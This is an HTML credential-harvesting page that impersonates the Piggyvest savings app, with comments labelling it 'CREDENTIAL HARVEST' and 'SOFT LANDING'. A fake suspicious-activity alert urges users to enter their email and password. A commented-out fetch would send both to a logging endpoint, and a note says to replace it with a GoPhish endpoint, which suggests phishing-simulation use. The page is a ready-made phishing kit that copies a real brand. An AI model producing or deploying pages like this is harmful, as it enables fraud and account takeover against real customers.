<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify Your Identity — Piggyvest</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: -apple-system, 'Helvetica Neue', Arial, sans-serif;
      background: #f0f7f4;
      min-height: 100vh;
      color: #0d1f3c;
    }

    /* ── PAGES ── */
    .page { display: none; min-height: 100vh; flex-direction: column; }
    .page.active { display: flex; }

    /* ── NAV ── */
    nav {
      background: #e8f5f0;
      border-bottom: 1px solid #d4ece4;
      height: 68px;
      padding: 0 48px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      z-index: 100;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 9px;
      text-decoration: none;
      flex-shrink: 0;
    }
    .logo-text {
      font-size: 19px;
      font-weight: 800;
      color: #0d1f3c;
      letter-spacing: -0.4px;
    }

    .nav-links {
      display: flex;
      align-items: center;
      height: 68px;
      gap: 0;
      list-style: none;
    }
    .nav-links a {
      font-size: 14px;
      color: #0d1f3c;
      text-decoration: none;
      font-weight: 500;
      padding: 0 16px;
      height: 100%;
      display: flex;
      align-items: center;
      white-space: nowrap;
      transition: background 0.15s;
    }
    .nav-links a:hover { background: rgba(0,0,0,0.04); }

    .nav-btns {
      display: flex;
      align-items: center;
      gap: 10px;
      flex-shrink: 0;
    }
    .btn-create {
      background: #0d1f3c;
      color: #fff;
      border: none;
      border-radius: 100px;
      padding: 10px 20px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      white-space: nowrap;
      transition: background 0.15s;
    }
    .btn-create:hover { background: #1a3460; }
    .btn-signin {
      background: transparent;
      color: #0d1f3c;
      border: 1.5px solid #0d1f3c;
      border-radius: 100px;
      padding: 9px 20px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      white-space: nowrap;
      transition: background 0.15s, color 0.15s;
    }
    .btn-signin:hover { background: #0d1f3c; color: #fff; }

    /* ── ALERT BANNER ── */
    .alert-bar {
      background: #fff3f3;
      border-left: 4px solid #dc2626;
      padding: 13px 48px;
      display: flex;
      align-items: center;
      gap: 14px;
    }
    .alert-icon {
      width: 24px;
      height: 24px;
      background: #dc2626;
      border-radius: 50%;
      flex-shrink: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-size: 14px;
      font-weight: 800;
    }
    .alert-text strong {
      font-size: 13px;
      color: #991b1b;
      display: block;
      margin-bottom: 2px;
    }
    .alert-text span { font-size: 12px; color: #b91c1c; }

    /* ── PAGE 1 BODY ── */
    .page1-body {
      flex: 1;
      background: #f0f7f4;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 48px 24px;
    }

    .login-card {
      background: #fff;
      border: 1px solid #d4ece4;
      border-radius: 18px;
      padding: 40px 36px;
      width: 100%;
      max-width: 420px;
      animation: fadeUp 0.3s ease;
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(12px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    .card-logo {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 24px;
    }
    .card-logo-text { font-size: 16px; font-weight: 800; color: #0d1f3c; }

    .card-title { font-size: 24px; font-weight: 800; color: #0d1f3c; margin-bottom: 6px; }
    .card-sub { font-size: 13px; color: #6b7280; margin-bottom: 28px; line-height: 1.55; }

    .field { margin-bottom: 18px; }
    .field label {
      display: block;
      font-size: 12px;
      font-weight: 600;
      color: #374151;
      margin-bottom: 6px;
      letter-spacing: 0.02em;
    }
    .field input {
      width: 100%;
      padding: 12px 14px;
      border: 1.5px solid #d1fae5;
      border-radius: 10px;
      font-size: 14px;
      color: #0d1f3c;
      background: #f8fffe;
      outline: none;
      transition: border-color 0.15s, box-shadow 0.15s;
    }
    .field input:focus {
      border-color: #10b981;
      box-shadow: 0 0 0 3px rgba(16,185,129,0.12);
    }
    .field input::placeholder { color: #9ca3af; }

    .verify-btn {
      width: 100%;
      padding: 13px;
      background: #0d1f3c;
      color: #fff;
      border: none;
      border-radius: 100px;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 6px;
      transition: background 0.15s, transform 0.1s;
      letter-spacing: 0.1px;
    }
    .verify-btn:hover { background: #1a3460; }
    .verify-btn:active { transform: scale(0.98); }

    .card-help {
      text-align: center;
      margin-top: 18px;
      font-size: 12px;
      color: #6b7280;
    }
    .card-help a { color: #10b981; text-decoration: none; font-weight: 500; }
    .card-help a:hover { text-decoration: underline; }

    .card-divider {
      border: none;
      border-top: 1px solid #f0f9f4;
      margin: 20px 0;
    }

    .card-secure {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      font-size: 11px;
      color: #9ca3af;
    }

    /* ── PAGE 2 BODY ── */
    .page2-body {
      flex: 1;
      background: #f0f7f4;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 48px 24px;
    }

    .success-card {
      background: #fff;
      border: 1px solid #d4ece4;
      border-radius: 18px;
      padding: 48px 36px;
      width: 100%;
      max-width: 420px;
      text-align: center;
      animation: fadeUp 0.3s ease;
    }

    .check-ring {
      width: 72px;
      height: 72px;
      border-radius: 50%;
      background: #f0fdf4;
      border: 2px solid #86efac;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 22px;
    }

    .success-title { font-size: 24px; font-weight: 800; color: #0d1f3c; margin-bottom: 10px; }
    .success-sub { font-size: 14px; color: #6b7280; line-height: 1.6; margin-bottom: 6px; }
    .success-time { font-size: 12px; color: #9ca3af; margin-bottom: 32px; }

    .dashboard-btn {
      display: inline-block;
      padding: 13px 32px;
      background: #0d1f3c;
      color: #fff;
      border-radius: 100px;
      font-size: 14px;
      font-weight: 700;
      text-decoration: none;
      border: none;
      cursor: pointer;
      transition: background 0.15s;
    }
    .dashboard-btn:hover { background: #1a3460; }

    .success-badge {
      display: inline-block;
      margin-top: 22px;
      background: #f0fdf4;
      color: #166534;
      font-size: 11px;
      padding: 5px 14px;
      border-radius: 20px;
      border: 1px solid #bbf7d0;
    }

    /* ── FOOTER ── */
    footer {
      background: #e8f5f0;
      border-top: 1px solid #d4ece4;
      padding: 16px 48px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 8px;
    }
    footer span { font-size: 11px; color: #9ca3af; }
    .footer-links { display: flex; gap: 16px; }
    .footer-links a { font-size: 11px; color: #9ca3af; text-decoration: none; }
    .footer-links a:hover { color: #10b981; }

    /* ── RESPONSIVE ── */
    @media (max-width: 640px) {
      nav { padding: 0 20px; }
      .nav-links { display: none; }
      .alert-bar { padding: 12px 20px; }
      .page1-body, .page2-body { padding: 32px 16px; }
      .login-card, .success-card { padding: 28px 20px; }
      footer { padding: 14px 20px; }
    }
  </style>
</head>
<body>

  <!-- ══════════════════════════════════════
       PAGE 1 — CREDENTIAL HARVEST
  ══════════════════════════════════════ -->
  <div class="page active" id="page1">

    <nav>
      <a class="logo" href="#">
        <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
          <rect width="28" height="28" rx="8" fill="#0d1f3c"/>
          <ellipse cx="14" cy="15.5" rx="7" ry="6" fill="#e8f5f0"/>
          <circle cx="14" cy="13" r="4" fill="#0d1f3c"/>
          <rect x="12" y="9" width="4" height="5" rx="2" fill="#e8f5f0"/>
          <circle cx="16.5" cy="15.5" r="1.3" fill="#10b981"/>
        </svg>
        <span class="logo-text">piggyvest</span>
      </a>

      <ul class="nav-links">
        <li><a href="#">Save &#9662;</a></li>
        <li><a href="#">Invest</a></li>
        <li><a href="#">Stories</a></li>
        <li><a href="#">FAQs</a></li>
        <li><a href="#">Resources &#9662;</a></li>
      </ul>

      <div class="nav-btns">
        <button class="btn-create">Create free account</button>
        <button class="btn-signin">Sign in</button>
      </div>
    </nav>

    <div class="alert-bar">
      <div class="alert-icon">!</div>
      <div class="alert-text">
        <strong>Suspicious activity detected on your account</strong>
        <span>We noticed unusual login attempts from an unrecognised device. Please verify your identity immediately to avoid account suspension.</span>
      </div>
    </div>

    <div class="page1-body">
      <div class="login-card">

        <div class="card-logo">
          <svg width="22" height="22" viewBox="0 0 28 28" fill="none">
            <rect width="28" height="28" rx="8" fill="#0d1f3c"/>
            <ellipse cx="14" cy="15.5" rx="7" ry="6" fill="#e8f5f0"/>
            <circle cx="14" cy="13" r="4" fill="#0d1f3c"/>
            <rect x="12" y="9" width="4" height="5" rx="2" fill="#e8f5f0"/>
            <circle cx="16.5" cy="15.5" r="1.3" fill="#10b981"/>
          </svg>
          <span class="card-logo-text">piggyvest</span>
        </div>

        <h1 class="card-title">Verify your identity</h1>
        <p class="card-sub">An unrecognised device attempted to access your account. Confirm your identity to secure your workspace.</p>

        <div class="field">
          <label for="email">Email address</label>
          <input type="email" id="email" placeholder="Enter your email address" autocomplete="off"/>
        </div>

        <div class="field">
          <label for="password">Password</label>
          <input type="password" id="password" placeholder="Enter your password"/>
        </div>

        <button class="verify-btn" onclick="goToPage2()">Verify my account</button>

        <p class="card-help">Having trouble? <a href="#">Contact IT support</a></p>

        <hr class="card-divider"/>

        <div class="card-secure">
          <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
            <path d="M6 1L2 2.5v3.5c0 2.2 1.7 4.2 4 4.8 2.3-.6 4-2.6 4-4.8V2.5L6 1z" fill="#d1fae5" stroke="#10b981" stroke-width="0.8"/>
          </svg>
          <span>256-bit SSL encrypted &nbsp;·&nbsp; Your data is protected</span>
        </div>

      </div>
    </div>

    <footer>
      <span>© 2026 Piggyvest Inc. All rights reserved.</span>
      <div class="footer-links">
        <a href="#">Privacy Policy</a>
        <a href="#">Terms of Service</a>
        <a href="#">Security</a>
        <a href="#">Help Centre</a>
      </div>
    </footer>

  </div>


  <!-- ══════════════════════════════════════
       PAGE 2 — SOFT LANDING
  ══════════════════════════════════════ -->
  <div class="page" id="page2">

    <nav>
      <a class="logo" href="#">
        <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
          <rect width="28" height="28" rx="8" fill="#0d1f3c"/>
          <ellipse cx="14" cy="15.5" rx="7" ry="6" fill="#e8f5f0"/>
          <circle cx="14" cy="13" r="4" fill="#0d1f3c"/>
          <rect x="12" y="9" width="4" height="5" rx="2" fill="#e8f5f0"/>
          <circle cx="16.5" cy="15.5" r="1.3" fill="#10b981"/>
        </svg>
        <span class="logo-text">piggyvest</span>
      </a>

      <ul class="nav-links">
        <li><a href="#">Save &#9662;</a></li>
        <li><a href="#">Invest</a></li>
        <li><a href="#">Stories</a></li>
        <li><a href="#">FAQs</a></li>
        <li><a href="#">Resources &#9662;</a></li>
      </ul>

      <div class="nav-btns">
        <button class="btn-create">Create free account</button>
        <button class="btn-signin">Sign in</button>
      </div>
    </nav>

    <div class="page2-body">
      <div class="success-card">

        <div class="check-ring">
          <svg width="34" height="34" viewBox="0 0 34 34" fill="none">
            <circle cx="17" cy="17" r="16" fill="#dcfce7" stroke="#86efac" stroke-width="1.5"/>
            <path d="M10 17l5.5 5.5 9.5-9.5" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </div>

        <h1 class="success-title">Identity verified</h1>
        <p class="success-sub">Your workspace has been secured successfully. The unrecognised device has been blocked and no further action is required.</p>
        <p class="success-time">Verified at <span id="vtime">—</span> &nbsp;·&nbsp; Session ID: <span id="sid"></span></p>

        <a class="dashboard-btn" href="https://piggyvest.com">Return to dashboard</a>

        <br/>
        <span class="success-badge">&#128274; Your session is protected</span>

      </div>
    </div>

    <footer>
      <span>© 2026 Piggyvest Inc. All rights reserved.</span>
      <div class="footer-links">
        <a href="#">Privacy Policy</a>
        <a href="#">Terms of Service</a>
        <a href="#">Security</a>
        <a href="#">Help Centre</a>
      </div>
    </footer>

  </div>


  <script>
    function goToPage2() {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      /* ── TRACKING HOOK ──────────────────────────────────────────
         Replace the URL below with your GoPhish / logging endpoint.
         The fetch sends captured data silently in the background.
         GoPhish endpoint example: /report?rid={{.RId}}
      ────────────────────────────────────────────────────────── */
      // fetch('/log', {
      //   method: 'POST',
      //   headers: { 'Content-Type': 'application/json' },
      //   body: JSON.stringify({ email, password, ts: new Date().toISOString() })
      // });

      document.getElementById('page1').classList.remove('active');
      document.getElementById('page2').classList.add('active');

      const now = new Date();
      document.getElementById('vtime').textContent =
        now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

      const sid = Math.random().toString(36).substring(2, 10).toUpperCase();
      document.getElementById('sid').textContent = sid;

      window.scrollTo(0, 0);
    }
  </script>

</body>
</html>
